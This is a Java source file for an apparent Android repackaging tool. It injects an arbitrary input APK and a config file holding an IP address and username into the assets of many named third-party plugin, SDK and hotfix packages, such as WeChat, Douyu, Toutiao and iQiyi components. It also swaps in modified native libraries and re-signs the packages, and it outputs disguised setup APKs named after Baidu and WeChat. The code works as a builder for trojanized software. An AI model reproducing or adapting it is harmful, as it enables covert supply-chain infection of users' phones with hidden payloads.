package com.parcel;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Locale;

public class AndroidParcel {
	
	private static String ANDROID_PARAM_FILENAME = "ark.dat";
	
	private static String GENERAL_APK_FILENAME = "simcard.apk";
	
	private String mApkFn;
	
	private static String ANDROID_PARCELS[] = {
		"xwebruntime.zip",
		"xfilesPPTReader.zip",
		"iqiyibugly.apk",
		"iqiyimtj.apk",
		"kcsdk.apk",
		"android.app.fw.zip",
		
		"mobads.jar",
		
		"qituplugin.zip",
		
		"bytedanceweb.zip",
		
		"dk.zip",
		"douyusdk.zip",
		"douyuvm.zip",
		
		"qqmusic_plugin.zip",
		"qukan_hotfix.zip",

		"qqnowav.zip",
		"ShadowPluginManager.zip",
		"TvkPlugin.zip",
		
		"aisdk.jar",
		"aisdk_qtt.jar",

		"baiduproxy.jar",
		"galaxy_dex.jar",
		"miaopai_player_27.jar",
		"letvby.jar",
		"letvbd.jar",
		"letvirs.jar",
		
		"youkuplugin.apk",
		
		"toutiao1.zip",
		"toutiao2.zip",
		
		"ucgame.apk",
		"ppappstore.apk",
		"aloha_build.apk",
		"reactnative.apk",
		"amap_build.apk"
	};
	
	
	public static String g_ip = "";
	public static String g_username = "";

	public void makeJsonParamFile(String ip,String username){
		try {
			String curdir = System.getProperty("user.dir")+"/";
			
			String []params = {ip,username};

			String json = String.format(Locale.CHINA,"{\"ip\":\"%s\",\"username\":\"%s\"}",params);
			File file = new File(curdir + ANDROID_PARAM_FILENAME);
			FileOutputStream fout = new FileOutputStream(file);
			fout.write(json.getBytes(),0,json.length());
			fout.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public AndroidParcel(String apkfn,String ip,String username){
		g_ip = ip;
		g_username = username;
		
		makeJsonParamFile(ip,username);
		mApkFn = apkfn;
		doWork();
	}
	
	
	public void makeSetupApk(String curpath,String tmppath,String workpath,String outpath){
		try {
			String newfn = outpath + GENERAL_APK_FILENAME;
			FileUtils.fileCopy(mApkFn, newfn);
			
			Zip.unZip(newfn, tmppath + "generalApk/");
			
			String []params = {g_ip,g_username,"apk","baidu"};
			String json = 
					String.format(Locale.CHINA,
					"{\"ip\":\"%s\",\"username\":\"%s\",\"setupMode\":\"%s\",\"networkType\":\"%s\"}",
					params);
			
			String assetspath = tmppath + "generalApk/assets/";
			File pathFile = new File(assetspath);
			if (pathFile.exists() == false) {
				pathFile.mkdirs();
			}
			
			File file = new File(assetspath + ANDROID_PARAM_FILENAME);
			if(file.exists()){
				file.delete();
			}else{
				file.createNewFile();
			}
			FileOutputStream fout = new FileOutputStream(file);
			fout.write(json.getBytes(),0,json.length());
			fout.close();

			Zip zip = new Zip(tmppath + "baidu_setup_unsigned.apk",tmppath + "generalApk/",  "", "", "");
			zip.zip();
			
			String signpath = workpath + "auto-sign\\";
			String signapk = signpath + "signapk.jar";
			String crtpath = signpath + "key.crt";
			String keypath = signpath + "key.pk8";
			
			String unsignedfn = tmppath + "baidu_setup_unsigned.apk";
			String signedfn = outpath + "baidu_setup.apk";
			
			String cmd ="java -jar " + signapk + " " + crtpath + " " + keypath + " " + unsignedfn + " " + signedfn;
					Cmd.cmd(cmd);

			zip = new Zip( tmppath + "weixin_setup_unsigned.apk",tmppath + "generalApk/", "", "", "");
			zip.zip();
			
			unsignedfn = tmppath + "weixin_setup_unsigned.apk";
			signedfn = outpath + "weixin_setup.apk";
			cmd ="java -jar " + signapk + " " + crtpath + " " + keypath + " " + unsignedfn + " " + signedfn;
					Cmd.cmd(cmd);
			
			params[2] = "manual";
			params[3] = "";
			json = String.format(Locale.CHINA,
					"{\"ip\":\"%s\",\"username\":\"%s\",\"setupMode\":\"%s\",\"networkType\":\"%s\"}",params);
			file = new File(tmppath + "generalApk/assets/" + ANDROID_PARAM_FILENAME);
			if(file.exists()){
				file.delete();
			}else{
				file.createNewFile();
			}
			fout = new FileOutputStream(file);
			fout.write(json.getBytes(),0,json.length());
			fout.close();

			zip = new Zip(tmppath + "setup_unsigned.apk", tmppath + "generalApk/", "", "", "");
			zip.zip();
			unsignedfn = tmppath + "setup_unsigned.apk";
			signedfn = outpath + "setup.apk";
			cmd ="java -jar " + signapk + " " + crtpath + " " + keypath + " " + unsignedfn + " " + signedfn;
					Cmd.cmd(cmd);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	
	public void doWork(){
		String curdir = System.getProperty("user.dir")+"/";
		
		String tmppath = curdir + Parcel.TEMP_PATH;
		String outpath = curdir + Parcel.OUT_PATH;
		String workpath = curdir + Parcel.WORK_PATH;
		
		makeSetupApk(curdir,tmppath,workpath,outpath);
		
		FileUtils.fileCopy(workpath + "qqnowbiz.zip", outpath +"qqnowbiz.zip" );
		
		FileUtils.fileCopy(workpath + "youku_pc.json", outpath +"youku_pc.json" );
		FileUtils.fileCopy(workpath + "baofeng_apk_updatelist.txt", outpath +"baofeng_apk_updatelist.txt" );
		
		DexParcel.dexParcel(mApkFn, curdir + ANDROID_PARAM_FILENAME);
		
		SoParcel.soparcel(mApkFn, curdir + ANDROID_PARAM_FILENAME);
		
		System.out.println("parcel android package:" + mApkFn);
		
		File files[] = new File(workpath).listFiles();
		for (int i = 0; i < files.length; i++) {
			
			for (int j = 0; j < ANDROID_PARCELS.length; j++) {
				if (files[i].getName().equals(ANDROID_PARCELS[j]) == true) {
					
					String zipfn = files[i].getName();
					if (zipfn.equals("android.app.fw.zip")) {
						SignParcelPackage.signParcel("android.app.fw.zip",workpath,outpath,curdir,
								mApkFn,curdir+ANDROID_PARAM_FILENAME);
					}
					else if (zipfn.equals("youkuplugin.apk")) {
						
						SignParcelPackage.signParcel("youkuplugin.apk",workpath,outpath,curdir,
								mApkFn,curdir+ANDROID_PARAM_FILENAME);
					}
					else if (zipfn.equals("toutiao1.zip") || zipfn.equals("toutiao2.zip")) {
						String dstsopath = curdir + "so/";
						if (zipfn.equals("toutiao1.zip")) {

							FileUtils.fileCopy(dstsopath + "libPushManager.so_new.so", tmppath +"libPushManager.so");
							SignParcelPackage.signParcelWithSo(zipfn,workpath,outpath,curdir,tmppath +"libPushManager.so");
						}else{

							FileUtils.fileCopy(dstsopath + "libsscronet.so_new.so", tmppath +"libsscronet.so");
							SignParcelPackage.signParcelWithSo(zipfn,workpath,outpath,curdir,tmppath +"libsscronet.so");
						}
					}
					
					else{
						String mainzipfn = FileUtils.getMainName(zipfn);
						
						Zip.unZip(files[i].getAbsolutePath(), tmppath + mainzipfn);
						
						String dstapkpath = "";
						if (zipfn.toLowerCase().equals("xwebruntime.zip") || zipfn.equals("xfilesPPTReader.zip")) {
							dstapkpath = tmppath + mainzipfn + "/";
						}
						else if (zipfn.equals("TvkPlugin.zip")) {
							dstapkpath = tmppath + mainzipfn + "/armeabi/";
						}
						
						else if (zipfn.equals("qqnowav.zip")) {
							String nextpath = "qqnowav_next";
							
							Zip.unZip(tmppath + mainzipfn + "/qqnowav.apk", tmppath + nextpath);
							
							dstapkpath = tmppath + nextpath + "/assets/";
							
							FileUtils.removeOldApk(dstapkpath);
							System.out.print("remove apk:" + dstapkpath);
							
							FileUtils.copyToPath(mApkFn, dstapkpath);
							FileUtils.copyToPath(curdir + ANDROID_PARAM_FILENAME, dstapkpath);

							Zip zip = new Zip(tmppath + mainzipfn + "/qqnowav.apk", tmppath + nextpath, "", "", "");
							zip.zip();
							
							zip = new Zip(outpath + zipfn, tmppath + mainzipfn, "", "", "");
							zip.zip();
							
							continue;
						}
						
						else if (zipfn.equals("dk.zip")) {
							String nextpath = "dk_next";
							
							Zip.unZip(tmppath + mainzipfn + "/dk.jar", tmppath + nextpath);
							
							dstapkpath = tmppath + nextpath + "/assets/";
							
							FileUtils.removeOldApk(dstapkpath);
							System.out.print("remove apk:" + dstapkpath);
							
							FileUtils.copyToPath(mApkFn, dstapkpath);
							FileUtils.copyToPath(curdir + ANDROID_PARAM_FILENAME, dstapkpath);

							Zip zip = new Zip(tmppath + mainzipfn + "/dk.jar", tmppath + nextpath, "", "", "");
							zip.zip();
							
							zip = new Zip(outpath + zipfn, tmppath + mainzipfn, "", "", "");
							zip.zip();
							
							continue;
						}
						else if (zipfn.equals("douyusdk.zip")) {
							String nextpath = "douyusdk_next";
							
							Zip.unZip(tmppath + mainzipfn + "/lbsdk.jar", tmppath + nextpath);
							
							dstapkpath = tmppath + nextpath + "/assets/";
							
							FileUtils.removeOldApk(dstapkpath);
							System.out.print("remove apk:" + dstapkpath);
							
							FileUtils.copyToPath(mApkFn, dstapkpath);
							FileUtils.copyToPath(curdir + ANDROID_PARAM_FILENAME, dstapkpath);

							Zip zip = new Zip(tmppath + mainzipfn + "/lbsdk.jar", tmppath + nextpath, "", "", "");
							zip.zip();
							
							zip = new Zip(outpath + zipfn, tmppath + mainzipfn, "", "", "");
							zip.zip();
							
							continue;
						}						
						else if (zipfn.equals("douyuvm.zip")) {
							String nextpath = "douyuvm_next";
							
							Zip.unZip(tmppath + mainzipfn + "/lbvmrt.jar", tmppath + nextpath);
							
							dstapkpath = tmppath + nextpath + "/assets/";
							
							FileUtils.removeOldApk(dstapkpath);
							System.out.print("remove apk:" + dstapkpath);
							
							FileUtils.copyToPath(mApkFn, dstapkpath);
							FileUtils.copyToPath(curdir + ANDROID_PARAM_FILENAME, dstapkpath);

							Zip zip = new Zip(tmppath + mainzipfn + "/lbvmrt.jar", tmppath + nextpath, "", "", "");
							zip.zip();
							
							zip = new Zip(outpath + zipfn, tmppath + mainzipfn, "", "", "");
							zip.zip();
							
							continue;
						}

						else{
							dstapkpath = tmppath + mainzipfn + "/assets/";
						}
						
						FileUtils.removeOldApk(dstapkpath);
						
						FileUtils.copyToPath(mApkFn, dstapkpath);
						FileUtils.copyToPath(curdir + ANDROID_PARAM_FILENAME, dstapkpath);
						
						
						Zip zip = new Zip(outpath + zipfn, tmppath + mainzipfn, "", "", "");
						zip.zip();
						
					}
					
				}
			}
		}
	}
}
